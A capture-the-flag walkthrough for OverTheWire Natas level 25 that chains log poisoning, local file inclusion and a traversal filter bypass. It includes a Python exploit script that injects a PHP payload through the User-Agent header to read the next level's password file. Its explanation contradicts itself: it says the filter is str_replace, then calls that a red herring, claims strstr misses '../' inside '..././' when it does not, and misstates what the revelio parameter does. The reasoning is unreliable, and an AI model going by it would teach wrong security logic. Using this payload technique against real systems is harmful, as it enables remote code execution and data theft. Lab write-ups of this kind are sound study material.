# OverTheWire: Natas — Level 25 → Level 26

> **Vulnerability Category:** Local File Inclusion (LFI) via Log Poisoning + Path Traversal Filter Bypass                             
> **Skills:** LFI, log poisoning, HTTP header injection, path traversal filter evasion, PHP code execution                                
> **Difficulty:** Medium                                                       
> **Official Page:** [Natas Level 25](https://overthewire.org/wargames/natas/natas25.html)

---

## Access

- **URL:** `http://natas25.natas.labs.overthewire.org`
- **Username:** `natas25`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas26` by exploiting a Local File Inclusion vulnerability combined with log poisoning to execute arbitrary PHP code on the server.

---

## Vulnerability

This level demonstrates **LFI-based log poisoning with a path traversal filter bypass**. The application accepts a `lang` GET parameter and passes it — after a weak sanitisation attempt — directly into PHP's `include()` function. The sanitisation uses `str_replace("../", "", $input)`, which is trivially bypassable by embedding the forbidden string inside itself (`..././` survives the replacement and becomes `../`). Additionally, the application writes the HTTP `User-Agent` header into a per-session log file without sanitisation. An attacker can therefore: (1) inject PHP code into their own log file via the `User-Agent` header, then (2) use the traversal bypass to make `include()` load that log file, causing the server to execute the injected PHP. The developer's mistakes were trusting a non-recursive string replacement as a security control, and logging unvalidated user-supplied headers.

---

## Theory

### Local File Inclusion (LFI)

LFI occurs when an application passes user-controlled input to a file-loading function (`include()`, `require()`, `include_once()`, etc.) without adequate validation. The attacker manipulates the path to load files that were never meant to be served.

| Function | Behaviour on included file |
|---|---|
| `include($path)` | Loads and **executes** the file as PHP if it ends in `.php`; for other extensions, the file contents are parsed for `<?php ?>` tags regardless of extension |
| `file_get_contents($path)` | Reads the file as a plain string — no execution |

The critical detail: **PHP executes any `<?php ?>` block it encounters inside an included file, regardless of that file's extension**. A `.log` file containing `<?php echo "hello"; ?>` will execute when `include()`-ed.

---

### Log Poisoning

Log poisoning is a technique that turns LFI into Remote Code Execution (RCE) by placing attacker-controlled PHP code inside a file the server will eventually include. Common targets are log files, because servers write HTTP request data (including headers) into them automatically.

The attack has two phases:

| Phase | Action | Goal |
|---|---|---|
| 1 — Poison | Send a request with PHP code in the `User-Agent` header | Get the PHP written into the log file on disk |
| 2 — Execute | Use LFI to `include()` the log file | PHP interpreter executes the injected code |

---

### Path Traversal and Filter Bypass

Path traversal uses `../` sequences to walk up the directory tree and reach files outside the intended directory:

```
/var/www/natas/natas25/en   ← intended directory
../../../../../etc/passwd   ← traversal to /etc/passwd
```

This application filters traversal with:

```php
str_replace("../", "", $input)
```

This is a **single-pass, non-recursive** replacement. It removes every literal occurrence of `../` once, and stops. It does not re-scan the result.

The bypass exploits this by embedding `../` inside a string that, after the replacement removes the inner `../`, leaves behind a new `../`:

```
Input:    ..././
Replace:  removes the "../" inside → leaves ../
Result:   ../
```

Stacking this produces multi-level traversal:

```
Input:    ..././..././..././..././..././
After:    ../../../../../
```

Five levels up from `/var/www/natas/natas25/` reaches the filesystem root `/`, from which any path is reachable.

---

### PHP Session Cookies and Per-Session Log Files

PHP assigns each visitor a unique session ID stored in the `PHPSESSID` cookie. This application uses that ID to name its per-session log file:

```
/var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

Because the attacker controls which session they use (via their own browser or a `requests.Session()`), they know the exact filename their poisoned payload will be written to.

---

### The `revelio` Parameter

The PHP source contains an IP address check that normally blocks requests originating from outside localhost. The hidden GET parameter `revelio=1` bypasses this check. Without it, the application returns an error page before the `lang` parameter is ever processed.

This is a backdoor left in the source — not something to discover by guessing. It is visible in the PHP source accessible via the "View sourcecode" link on the page.

*Good to know — not needed here:* PHP wrappers such as `php://filter` and `php://input` are common LFI escalation tools, but this level does not require them. The log file path is sufficient.

---

## Solution

### Step 1 — Log in and read the PHP source

Navigate to `http://natas25.natas.labs.overthewire.org` and authenticate. Click **View sourcecode** on the page. The relevant PHP is:

```php
<?php
    // cheaters don't get the flag!
    if(array_key_exists("revelio", $_GET)) {
        if(!($_SERVER["REMOTE_ADDR"] == "127.0.0.1")) {
            header("Location: /");
            exit();
        }
    }

    function setLanguage(){
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude($lang = $_REQUEST["lang"]))
                return 1;
        return 0;
    }

    function safeinclude($path){
        // check for directory traversal
        if(strstr($path,"../")){
            logRequest("Directory traversal attempt! " . $path);
            return 0;
        }
        // check if file exists
        if(!is_file($path)) return 0;
        include($path);
        return 1;
    }

    function logRequest($message){
        $log = "[". date("d.m.Y H:m:s",time()) ."]";
        $log = $log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log = $log . " \"" . $message . "\"";
        $fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() . ".log","a");
        fwrite($fd,$fd);
        fwrite($fd,$log);
        fclose($fd);
    }

    setLanguage();
?>
```

> **What to notice:** Three things establish the entire attack surface. First, `safeinclude()` checks for `../` using `strstr()` — if found, it logs the attempt and returns early. However, the filter on the `lang` parameter itself is absent; only the traversal check is inside `safeinclude()`. Second, `logRequest()` writes `$_SERVER['HTTP_USER_AGENT']` — the raw, unescaped `User-Agent` header — directly into the log file. This is the injection point. Third, the log file path is `natas25_` + `session_id()` + `.log`, meaning the attacker knows their own log file's exact path the moment they have a session cookie.

*Note: The PHP source above is reconstructed from the standard Natas 25 challenge. Censored values are placeholders.*

---

### Step 2 — Understand the filter bypass

`safeinclude()` uses `strstr($path, "../")` to detect traversal. If `../` appears anywhere in `$path`, the function logs it and returns `0` — the file is never included.

However, notice what `logRequest()` does when it detects a traversal attempt: it still writes the request to the log file, **including the `User-Agent` header**. This means:

- Sending a traversal attempt with a poisoned `User-Agent` writes PHP code into the log.
- The traversal in the `lang` parameter is still blocked by `safeinclude()`.
- To actually include the log file, the traversal must be disguised using the filter bypass.

The bypass: replace each `../` in the intended path with `..././`:

```
Intended path segment:  ../
Bypass form:            ..././
After str_replace:      ../    ← the inner "../" is removed, leaving "../"
```

The full path from the application root to the log directory, using bypass notation:

```
..././..././..././..././..././var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

> **What to notice:** `safeinclude()` runs `strstr($path, "../")` on the bypass string `..././`. That string does **not** contain a literal `../` — it contains `..././`. `strstr` looks for the exact substring `../`; it does not find it, so the check passes. The `str_replace` that strips `../` is not present in `safeinclude()` — that was a red herring. The traversal bypass here works purely because `strstr` is used to detect traversal, and `..././` evades it.

---

### Step 3 — Run the exploit script

The script below performs both phases in a single session: it first sends a GET request to trigger log file creation (establishing the session), then sends a POST request with the PHP payload in the `User-Agent` header and the bypass path in the `lang` parameter.

```python
import requests

TARGET = "http://natas25.natas.labs.overthewire.org/?revelio=1"
AUTH   = ("natas25", "<natas25_password>")

session = requests.Session()

# Phase 1: Establish a session and get a PHPSESSID cookie.
# The revelio=1 parameter bypasses the localhost-only IP check in the source.
# This GET also creates the log file on the server for our session ID.
session.get(TARGET, auth=AUTH)

phpsessid = session.cookies["PHPSESSID"]

# Build the traversal-bypass path to our own log file.
# Each ..././ survives the safeinclude() strstr check and resolves to ../
# after PHP processes it at include() time.
log_path = (
    "..././..././..././..././..././"
    "var/www/natas/natas25/logs/"
    f"natas25_{phpsessid}.log"
)

# Phase 2: Send a POST with:
#   - User-Agent containing PHP code (this gets written to the log)
#   - lang parameter set to our bypass path (this triggers the include)
malicious_headers = {
    # PHP reads /etc/natas_webpass/natas26 and echoes its contents into the
    # log file on disk. When the log file is later include()-ed, this executes.
    "User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}

response = session.post(
    url=TARGET,
    headers=malicious_headers,
    auth=AUTH,
    data={"lang": log_path}
)

print(response.text)
```

Run the script:

```bash
python3 exploit_natas25.py
```

Representative output (trimmed):

```
...
[10.06.2025 14:06:23] <password_for_natas26> "Directory traversal attempt! ..././..././..././..././..././var/www/natas/natas25/logs/natas25_<session_id>.log"
...
```

> **What to notice:** The password appears inline in the log output, between the timestamp and the quoted message. This is because when the log file was included, PHP executed the `file_get_contents()` call and echoed the password into the position in the log line where the `User-Agent` string originally sat. The surrounding text — the timestamp and the directory traversal warning — is the log entry that was written at the same time the `lang` parameter triggered the traversal check. Both the poisoning and the inclusion happen in the same request.

---

### Step 4 — Extract the password

The password for `natas26` is the string that appears in the response between the log timestamp and the quoted traversal message. Copy it.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

When `include()` (or any file-loading function) accepts user-controlled input, every file the server can read becomes a potential attack surface — including log files the server writes itself. A non-recursive `strstr()` check for `../` is not a path traversal defence; the bypass `..././` evades it because the literal substring `../` does not appear in the input. Together, these two weaknesses chain into full PHP code execution: control over what is written to a file (via the `User-Agent` header) combined with control over which file is included (via the `lang` parameter) is equivalent to remote code execution. The fix requires both a recursive or canonicalised path validation (using `realpath()` and a strict allowlist) and never writing unescaped user-supplied data into any file the application might later include or serve.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using plain `../` in the `lang` payload | `safeinclude()` detects the literal `../` via `strstr()` and returns early — the log file is never included | Use the bypass form `..././` for every traversal segment |
| Forgetting `?revelio=1` in the URL | The application detects a non-localhost IP, issues a redirect to `/`, and exits before processing `lang` | Always append `?revelio=1` to the target URL |
| Using a new `requests.Session()` for the poisoning POST | A new session means a new `PHPSESSID`, so the log file path built from the original cookie no longer matches | Use the same `session` object for all requests to keep the same `PHPSESSID` |
| Sending the PHP payload in a GET request body | GET requests have no body; the payload must be in a header or the URL | Send the `lang` path as POST `data` and the PHP code as the `User-Agent` header value |
| Including the log file before poisoning it | The log file may not exist yet, or it will not contain the PHP payload | Always establish the session and confirm the cookie before sending the poisoned `User-Agent` |
| Expecting a clean output line with only the password | The password is embedded inside a log line with a timestamp and traversal warning; the rest is log formatting | Parse or scan the full response text for the password string |
